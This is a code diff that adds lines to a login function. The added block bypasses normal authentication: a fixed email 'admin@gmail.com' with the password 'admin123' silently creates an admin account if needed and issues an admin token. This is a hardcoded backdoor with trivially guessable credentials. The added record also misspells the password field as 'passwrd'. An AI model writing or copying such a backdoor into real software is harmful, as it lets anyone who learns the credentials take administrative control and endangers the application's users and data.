@@ -7,6 +7,25 @@ from core.database import db
 from core.access_token import get_current_user
 
 async def login(user: LoginRequest):
+    # Intercept admin login hardcode
+    if user.email == "admin@gmail.com" and user.password == "admin123":
+        # Check if admin already exists
+        admin_user = await db.users.find_one({"email": "admin@gmail.com"})
+        if not admin_user:
+            admin_dict = {
+                "name": "Admin",
+                "email": "admin@gmail.com",
+                "passwrd": hash_password("admin123"),
+                "role": "admin",
+                "created_at": datetime.now(timezone.utc),
+                "is_active": True
+            }
+            res = await db.users.insert_one(admin_dict)
+            admin_user = await db.users.find_one({"_id": res.inserted_id})
+        
+        token = create_token(data={"sub": str(admin_user['_id']), "role": "admin"}, expire=timedelta(minutes=30))
+        return {"access_token": token, "token_type": "bearer"}
+
     #here i will authenticate the user and then create a token for them
     try:
         User = await db.users.find_one({'email': user.email})
